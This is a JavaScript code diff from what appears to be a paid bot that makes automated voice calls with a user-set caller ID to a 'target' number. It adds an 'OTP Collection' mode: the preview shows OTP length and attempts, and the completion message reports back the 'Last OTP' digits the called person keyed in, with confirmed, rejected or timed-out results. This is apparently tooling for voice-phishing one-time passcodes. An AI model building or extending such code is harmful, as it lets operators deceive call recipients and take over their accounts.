@@ -174,13 +174,21 @@ function extractPlaceholders(text) {
  * Format call preview message
  */
 function formatCallPreview(data) {
+  const isOtp = data.ivrMode === 'otp_collect'
   const lines = [
     `<b>Review Your Call</b>`,
     ``,
     `📞 Target: <b>${data.targetNumber}</b>`,
     `📱 Caller ID: <b>${data.callerId}</b>`,
-    `⚡ Transfer to: <b>${data.ivrNumber}</b>`,
   ]
+
+  if (isOtp) {
+    lines.push(`🔑 Mode: <b>OTP Collection</b>`)
+    lines.push(`🔢 OTP Length: <b>${data.otpLength || 6} digits</b>`)
+    lines.push(`🔄 Max Attempts: <b>${data.otpMaxAttempts || 3}</b>`)
+  } else {
+    lines.push(`⚡ Transfer to: <b>${data.ivrNumber}</b>`)
+  }
 
   if (data.templateName) {
     lines.push(`📋 Template: <b>${data.templateName}</b>`)
@@ -195,8 +203,10 @@ function formatCallPreview(data) {
   }
 
   lines.push(`🎤 Voice: <b>${data.voiceName || 'Rachel'}</b>`)
-  lines.push(`🔘 Transfer key: <b>${data.activeKeys?.join(', ') || '1'}</b>`)
-  lines.push(`🎵 Hold Music: <b>${data.holdMusic ? 'ON' : 'OFF'}</b>`)
+  lines.push(`🔘 ${isOtp ? 'Trigger' : 'Transfer'} key: <b>${data.activeKeys?.join(', ') || '1'}</b>`)
+  if (!isOtp) {
+    lines.push(`🎵 Hold Music: <b>${data.holdMusic ? 'ON' : 'OFF'}</b>`)
+  }
   const ivrRate = parseFloat(process.env.BULK_CALL_RATE_PER_MIN || '0.15')
   lines.push(`💰 Rate: <b>$${ivrRate.toFixed(2)}/min</b> (from wallet)`)
   lines.push(``)
@@ -245,6 +255,10 @@ function formatCallNotification(type, data) {
       return `📵 <b>No answer</b> — ${target} did not pick up\n💰 Charged: 1 min (minimum)`
 
     case 'completed':
+      if (data.ivrMode === 'otp_collect') {
+        const otpResult = data.otpStatus === 'confirmed' ? '✅ Confirmed' : data.otpStatus === 'rejected' ? '❌ Rejected' : data.otpStatus === 'timeout' ? '⏰ Timed Out' : '—'
+        return `🔑 <b>OTP Call Completed</b>\n📞 ${target} | Duration: ${durText}\n🔢 Last OTP: ${data.otpDigits || 'None'}\n📊 Result: ${otpResult}\n🔄 Attempts: ${data.otpAttempt || 0}/${data.otpMaxAttempts || 3}`
+      }
       return `✅ <b>Call Completed</b>\n📞 ${target} | Duration: ${durText}\n🔘 Key pressed: ${data.digitPressed || 'None'}\n🔗 Transferred to: ${data.ivrNumber || '?'}`
 
     case 'transfer_failed':
